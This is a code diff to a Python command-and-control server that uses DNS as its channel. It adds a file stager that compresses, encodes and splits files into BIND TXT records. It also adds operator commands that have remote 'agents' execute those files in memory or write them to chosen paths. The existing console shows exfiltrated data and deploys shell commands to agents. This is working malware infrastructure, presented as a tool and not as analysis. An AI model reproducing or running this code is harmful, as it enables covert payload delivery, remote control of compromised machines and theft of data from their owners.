@@ -4,6 +4,10 @@ import time
 import subprocess
 import threading
 import sys
+import gzip
+import base64
+import hashlib
+import uuid
 from datetime import datetime
 from typing import Dict, Optional, Tuple, Set, List
 from pathlib import Path
@@ -218,6 +222,211 @@ class DNSZoneManager:
             self.console.error(f"Error sending SIGHUP or finding 'named' PID: {e}")
             self.console.error("Manual intervention required: Reload BIND service manually.")
             return False
+
+class StagedFile:
+    def __init__(self, file_id: str, filename: str, total_fragments: int, 
+                 original_size: int, compressed_size: int, checksum: str):
+        self.file_id = file_id
+        self.filename = filename
+        self.total_fragments = total_fragments
+        self.original_size = original_size
+        self.compressed_size = compressed_size
+        self.checksum = checksum
+        self.timestamp = datetime.now()
+
+class FileStager:
+    MAX_TXT_RECORD_SIZE = 220
+    DOWNLOAD_SUBDOMAIN = "dl"
+    
+    def __init__(self, zone_manager: DNSZoneManager, console: Console):
+        self.zone_manager = zone_manager
+        self.console = console
+        self._staged_files: Dict[str, StagedFile] = {}
+    
+    def stage_file(self, file_path: str, action: str = "EXEC", destination: str = "") -> Optional[str]:
+        path = Path(file_path)
+        if not path.exists():
+            self.console.error(f"File not found: {file_path}")
+            return None
+        
+        try:
+            with open(path, 'rb') as f:
+                raw_data = f.read()
+        except Exception as e:
+            self.console.error(f"Error reading file: {e}")
+            return None
+        
+        original_size = len(raw_data)
+        compressed = gzip.compress(raw_data, compresslevel=9)
+        encoded = base64.b64encode(compressed).decode('ascii')
+        checksum = hashlib.md5(raw_data).hexdigest()[:8]
+        
+        file_id = uuid.uuid4().hex[:8]
+        fragments = self._split_into_fragments(encoded)
+        total_fragments = len(fragments)
+        
+        self.console.info(f"Staging {Colors.CYAN}{path.name}{Colors.RESET}")
+        self.console.info(f"  Original: {original_size} bytes -> Compressed: {len(compressed)} bytes -> Encoded: {len(encoded)} bytes")
+        self.console.info(f"  Fragments: {total_fragments}, File ID: {Colors.YELLOW}{file_id}{Colors.RESET}")
+        
+        # Escape backslashes for DNS TXT records (Windows paths)
+        escaped_destination = destination.replace('\\', '\\\\') if destination else ""
+        meta_value = f"{action}|{total_fragments}|{checksum}|{path.name}|{escaped_destination}"
+        
+        if not self._add_dns_records(file_id, meta_value, fragments):
+            return None
+        
+        staged = StagedFile(file_id, path.name, total_fragments, original_size, len(compressed), checksum)
+        self._staged_files[file_id] = staged
+        
+        if self.zone_manager.reload_bind():
+            self.console.success(f"File staged successfully with ID: {Colors.BOLD}{file_id}{Colors.RESET}")
+            return file_id
+        
+        self.console.error("Failed to reload BIND after staging")
+        return None
+    
+    def _split_into_fragments(self, data: str) -> List[str]:
+        return [data[i:i + self.MAX_TXT_RECORD_SIZE] for i in range(0, len(data), self.MAX_TXT_RECORD_SIZE)]
+    
+    def _add_dns_records(self, file_id: str, meta: str, fragments: List[str]) -> bool:
+        lines = self.zone_manager.load_zone()
+        if not lines:
+            return False
+        
+        new_records = []
+        new_records.append(f"0.{file_id}.{self.DOWNLOAD_SUBDOMAIN} IN TXT \"{meta}\"\n")
+        
+        for idx, fragment in enumerate(fragments, start=1):
+            new_records.append(f"{idx}.{file_id}.{self.DOWNLOAD_SUBDOMAIN} IN TXT \"{fragment}\"\n")
+        
+        insert_idx = self._find_insert_position(lines)
+        for i, record in enumerate(new_records):
+            lines.insert(insert_idx + i, record)
+        
+        lines = self._update_serial_in_lines(lines)
+        
+        return self.zone_manager.write_zone(lines)
+    
+    def _find_insert_position(self, lines: List[str]) -> int:
+        for i, line in enumerate(lines):
+            if line.strip().startswith(';') and 'staged' in line.lower():
+                return i + 1
+        return len(lines)
+    
+    def _update_serial_in_lines(self, lines: List[str]) -> List[str]:
+        for i, line in enumerate(lines):
+            if 'Serial' in line:
+                serial_match = re.search(r'(\d+)\s+;\s+Serial', line)
+                if serial_match:
+                    current_serial = int(serial_match.group(1))
+                    date_part = datetime.now().strftime("%Y%m%d")
+                    if str(current_serial).startswith(date_part):
+                        new_serial = current_serial + 1
+                    else:
+                        new_serial = int(date_part + "01")
+                    lines[i] = re.sub(r'(\d+)\s+;\s+Serial', f'{new_serial}       ; Serial', line, count=1)
+                break
+        return lines
+    
+    def unstage_file(self, file_id: str) -> bool:
+        if file_id not in self._staged_files:
+            self.console.error(f"File ID {file_id} not found in staged files")
+            return False
+        
+        lines = self.zone_manager.load_zone()
+        if not lines:
+            return False
+        
+        pattern = re.compile(rf'^\d+\.{re.escape(file_id)}\.{self.DOWNLOAD_SUBDOMAIN}\s+IN\s+TXT')
+        lines = [line for line in lines if not pattern.match(line.strip())]
+        
+        lines = self._update_serial_in_lines(lines)
+        
+        if self.zone_manager.write_zone(lines):
+            if self.zone_manager.reload_bind():
+                del self._staged_files[file_id]
+                self.console.success(f"File {file_id} unstaged successfully")
+                return True
+        
+        return False
+    
+    def list_staged(self) -> Dict[str, StagedFile]:
+        return self._staged_files
+    
+    def recover_staged_files(self) -> int:
+        """Recover staged files from zone file on startup.
+        
+        Returns the number of recovered staged files.
+        """
+        lines = self.zone_manager.load_zone()
+        if not lines:
+            return 0
+        
+        meta_pattern = re.compile(
+            rf'^0\.([a-f0-9]+)\.{re.escape(self.DOWNLOAD_SUBDOMAIN)}\s+IN\s+TXT\s+"(.+)"',
+            re.IGNORECASE
+        )
+        
+        fragment_pattern = re.compile(
+            rf'^(\d+)\.([a-f0-9]+)\.{re.escape(self.DOWNLOAD_SUBDOMAIN)}\s+IN\s+TXT',
+            re.IGNORECASE
+        )
+        
+        recovered_count = 0
+        file_fragments: Dict[str, int] = {}
+        
+        for line in lines:
+            line_stripped = line.strip()
+            frag_match = fragment_pattern.match(line_stripped)
+            if frag_match:
+                seq_num = int(frag_match.group(1))
+                file_id = frag_match.group(2)
+                if seq_num > 0:  
+                    file_fragments[file_id] = file_fragments.get(file_id, 0) + 1
+        
+        for line in lines:
+            line_stripped = line.strip()
+            meta_match = meta_pattern.match(line_stripped)
+            if meta_match:
+                file_id = meta_match.group(1)
+                metadata = meta_match.group(2)
+                
+                if file_id in self._staged_files:
+                    continue
+                
+                parts = metadata.split('|')
+                if len(parts) >= 4:
+                    action = parts[0]
+                    total_fragments = int(parts[1])
+                    checksum = parts[2]
+                    filename = parts[3]
+                    
+                    staged = StagedFile(
+                        file_id=file_id,
+                        filename=filename,
+                        total_fragments=total_fragments,
+                        original_size=0,  
+                        compressed_size=0,  
+                        checksum=checksum
+                    )
+                    staged.timestamp = datetime.now()  
+                    
+                    self._staged_files[file_id] = staged
+                    recovered_count += 1
+                    
+                    self.console.info(
+                        f"Recovered staged file: {Colors.YELLOW}{file_id}{Colors.RESET} "
+                        f"({Colors.CYAN}{filename}{Colors.RESET}, {total_fragments} fragments)"
+                    )
+        
+        return recovered_count
+    
+    def deploy_exec(self, file_path: str) -> Optional[str]:
+        return self.stage_file(file_path, action="EXEC")
+    
+    def deploy_push(self, file_path: str, destination: str) -> Optional[str]:
+        return self.stage_file(file_path, action="PUSH", destination=destination)
 
 class DataDecoder:
     @staticmethod
@@ -441,6 +650,7 @@ class CLI:
         self.data_processor = DataProcessor(config, self.console, self.output_manager)
         self.command_deployer = CommandDeployer(self.zone_manager, self.console)
         self.log_monitor = LogMonitor(config.log_file, self.data_processor, self.console)
+        self.file_stager = FileStager(self.zone_manager, self.console)
     
     def run(self) -> None:
         self.console.banner()
@@ -477,6 +687,12 @@ class CLI:
             f"Processed {Colors.BOLD}{line_count}{Colors.RESET} log lines, "
             f"found {Colors.BOLD}{fragment_count}{Colors.RESET} data fragments"
         )
+        
+        recovered_staged = self.file_stager.recover_staged_files()
+        if recovered_staged > 0:
+            self.console.success(
+                f"Recovered {Colors.BOLD}{recovered_staged}{Colors.RESET} staged file(s) from zone file"
+            )
         self.console.success(
             f"Recovered {Colors.BOLD}{len(self.data_processor.get_all_sessions())}{Colors.RESET} command session(s)"
         )
@@ -528,6 +744,7 @@ class CLI:
     
     def _handle_command(self, user_input: str) -> bool:
         cmd_lower = user_input.lower()
+        cmd_upper = user_input.upper()
         
         if cmd_lower in ('exit', 'quit'):
             self.console.info("Exiting C2 CLI. Goodbye!")
@@ -546,18 +763,78 @@ class CLI:
             self.console.clear_screen()
             self.console.banner()
         
-        elif user_input.upper().startswith("CMD:"):
+        elif cmd_lower == 'staged':
+            self._show_staged_files()
+        
+        elif cmd_upper.startswith("CMD:"):
             raw_command = user_input[4:].strip()
             if raw_command:
                 self.command_deployer.deploy(raw_command)
             else:
                 self.console.warning("No command specified. Usage: CMD:<command>")
         
+        elif cmd_upper.startswith("EXEC:"):
+            file_path = user_input[5:].strip()
+            if file_path:
+                file_id = self.file_stager.deploy_exec(file_path)
+                if file_id:
+                    self.command_deployer.deploy(f"EXEC:{file_id}")
+            else:
+                self.console.warning("No file specified. Usage: EXEC:<file_path>")
+        
+        elif cmd_upper.startswith("PUSH:"):
+            parts = user_input[5:].strip().split(":", 1)
+            if len(parts) == 2:
+                file_path, destination = parts[0].strip(), parts[1].strip()
+                if file_path and destination:
+                    file_id = self.file_stager.deploy_push(file_path, destination)
+                    if file_id:
+                        self.command_deployer.deploy(f"PUSH:{file_id}")
+                else:
+                    self.console.warning("Invalid format. Usage: PUSH:<file_path>:<destination>")
+            else:
+                self.console.warning("Invalid format. Usage: PUSH:<file_path>:<destination>")
+        
+        elif cmd_upper.startswith("STAGE:"):
+            file_path = user_input[6:].strip()
+            if file_path:
+                self.file_stager.stage_file(file_path, action="STAGED")
+            else:
+                self.console.warning("No file specified. Usage: STAGE:<file_path>")
+        
+        elif cmd_upper.startswith("UNSTAGE:"):
+            file_id = user_input[8:].strip()
+            if file_id:
+                self.file_stager.unstage_file(file_id)
+            else:
+                self.console.warning("No file ID specified. Usage: UNSTAGE:<file_id>")
+        
         else:
             self.console.warning(f"Unknown command: {user_input}")
             self.console.info(f"Type {Colors.YELLOW}help{Colors.RESET} for available commands")
         
         return True
+    
+    def _show_staged_files(self) -> None:
+        staged = self.file_stager.list_staged()
+        
+        self.console.print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
+        self.console.print(f"{Colors.CYAN}{Colors.BOLD}  STAGED FILES{Colors.RESET}")
+        self.console.print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
+        
+        if not staged:
+            self.console.warning("No files currently staged.")
+        else:
+            for file_id, sf in staged.items():
+                self.console.print(f"\n  {Colors.YELLOW}ID:{Colors.RESET} {Colors.BOLD}{file_id}{Colors.RESET}")
+                self.console.print(f"  {Colors.CYAN}File:{Colors.RESET} {sf.filename}")
+                self.console.print(f"  {Colors.CYAN}Original Size:{Colors.RESET} {sf.original_size} bytes")
+                self.console.print(f"  {Colors.CYAN}Compressed:{Colors.RESET} {sf.compressed_size} bytes")
+                self.console.print(f"  {Colors.CYAN}Fragments:{Colors.RESET} {sf.total_fragments}")
+                self.console.print(f"  {Colors.CYAN}Checksum:{Colors.RESET} {sf.checksum}")
+                self.console.print(f"  {Colors.CYAN}Staged at:{Colors.RESET} {sf.timestamp.strftime('%Y-%m-%d %H:%M:%S')}")
+        
+        self.console.print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}\n")
     
     def _show_exfiltrated_data(self) -> None:
         self.console.print(f"\n{Colors.MAGENTA}{'='*60}{Colors.RESET}")
@@ -595,16 +872,24 @@ class CLI:
         self.console.print(f"\n{Colors.MAGENTA}{'='*60}{Colors.RESET}\n")
     
     def _show_help(self) -> None:
-        self.console.print(f"\n{Colors.CYAN}{'='*60}{Colors.RESET}")
+        self.console.print(f"\n{Colors.CYAN}{'='*65}{Colors.RESET}")
         self.console.print(f"{Colors.CYAN}{Colors.BOLD}  AVAILABLE COMMANDS{Colors.RESET}")
-        self.console.print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
-        self.console.print(f"  {Colors.YELLOW}CMD:<command>{Colors.RESET}  - Deploy a command to agents")
-        self.console.print(f"  {Colors.YELLOW}show{Colors.RESET}          - Show exfiltrated data")
-        self.console.print(f"  {Colors.YELLOW}status{Colors.RESET}        - Show current status summary")
-        self.console.print(f"  {Colors.YELLOW}clear{Colors.RESET}         - Clear the screen")
-        self.console.print(f"  {Colors.YELLOW}help{Colors.RESET}          - Show this help message")
-        self.console.print(f"  {Colors.YELLOW}exit{Colors.RESET}          - Exit the CLI")
-        self.console.print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")
+        self.console.print(f"{Colors.CYAN}{'='*65}{Colors.RESET}")
+        self.console.print(f"\n  {Colors.MAGENTA}{Colors.BOLD}Command Execution:{Colors.RESET}")
+        self.console.print(f"  {Colors.YELLOW}CMD:<command>{Colors.RESET}           - Deploy a shell command to agents")
+        self.console.print(f"\n  {Colors.MAGENTA}{Colors.BOLD}File Transfer:{Colors.RESET}")
+        self.console.print(f"  {Colors.YELLOW}EXEC:<file>{Colors.RESET}             - Stage file & execute in memory on agent")
+        self.console.print(f"  {Colors.YELLOW}PUSH:<file>:<dest>{Colors.RESET}      - Stage file & save to destination on agent")
+        self.console.print(f"  {Colors.YELLOW}STAGE:<file>{Colors.RESET}            - Stage file without deploying command")
+        self.console.print(f"  {Colors.YELLOW}UNSTAGE:<id>{Colors.RESET}            - Remove staged file from DNS")
+        self.console.print(f"  {Colors.YELLOW}staged{Colors.RESET}                  - List all staged files")
+        self.console.print(f"\n  {Colors.MAGENTA}{Colors.BOLD}General:{Colors.RESET}")
+        self.console.print(f"  {Colors.YELLOW}show{Colors.RESET}                    - Show exfiltrated data")
+        self.console.print(f"  {Colors.YELLOW}status{Colors.RESET}                  - Show current status summary")
+        self.console.print(f"  {Colors.YELLOW}clear{Colors.RESET}                   - Clear the screen")
+        self.console.print(f"  {Colors.YELLOW}help{Colors.RESET}                    - Show this help message")
+        self.console.print(f"  {Colors.YELLOW}exit{Colors.RESET}                    - Exit the CLI")
+        self.console.print(f"\n{Colors.CYAN}{'='*65}{Colors.RESET}\n")
     
     def _show_status(self) -> None:
         sessions = self.data_processor.get_all_sessions()
